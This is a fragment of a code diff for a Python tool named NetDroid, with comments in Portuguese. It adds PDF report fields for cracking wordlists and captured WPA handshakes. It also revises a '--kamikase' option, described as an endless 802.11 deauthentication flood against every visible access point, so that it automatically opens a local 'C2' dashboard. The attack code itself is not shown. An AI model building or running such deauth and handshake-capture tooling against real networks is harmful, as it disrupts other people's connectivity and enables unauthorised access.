+                        lines.append(f"<b>Wordlist:</b> {ap['wordlist_usada']}")
+                if ap.get("handshake_path"):
+                    lines.append(f"<b>Handshake:</b> {ap['handshake_path']}")
+                for ln in lines:
+                    elementos.append(Paragraph(ln, body))
+                elementos.append(Spacer(1, 6))
+
+        elementos.append(Spacer(1, 16))
+        elementos.append(Paragraph(
+            f"NetDroid v{VERSION} — Localhost only — Uso autorizado apenas", meta))
+
+        doc.build(elementos)
+        self.ui.success(f"PDF exportado: {path}")
 
 
 # ══════════════════ PDF REPORT ═════════════════════════════════
@@ -8290,9 +10520,10 @@ def build_parser() -> argparse.ArgumentParser:
                         "freios automáticos. Mostra '🚨 REDE CAIU' quando degrada mas continua.")
 
     p.add_argument("--kamikase", action="store_true",
-                   help="MODO DEAUTH WIFI: flood 802.11 infinito em todos os APs visíveis. "
-                        "EXIGE --root + autorização explícita. Funciona pleno em Kali Linux; "
-                        "Windows depende do driver da placa. USO LEGAL APENAS.")
+                   help="MODO DEAUTH WIFI + DASHBOARD: ativa o painel C2 em "
+                        "http://127.0.0.1:5556 automaticamente (--live implícito) "
+                        "com 3 zonas drag-drop. EXIGE --root. Funciona pleno em "
+                        "Kali Linux. USO LEGAL APENAS.")
 
     p.add_argument("--live", action="store_true",
                    help="DASHBOARD C2 EM TEMPO REAL: abre um painel web local elegante "
@@ -8335,6 +10566,14 @@ async def main_async(args):
         ui.error("--kamikase requer --root. Não há ataque 802.11 sem privilégio.")
         ui.info("Exemplo: sudo python NetDroid.py --root --kamikase")
         return
+
+    # ── --kamikase implica --live (decisão v1.5.4) ─────────
+    # O dashboard é inseparável da experiência do kamikase: zonas drag-drop,
+    # botões NMCLI/Scapy/Cadeado, recapturar handshake, etc. Ativar live
+    # automaticamente para o usuário não precisar lembrar do flag.
+    if args.kamikase and not args.live:
+        args.live = True
+        ui.info("ℹ --live ativado automaticamente com --kamikase")
 
     has_action = any([args.god, args.godfall, args.kamikase])
     if not has_action:
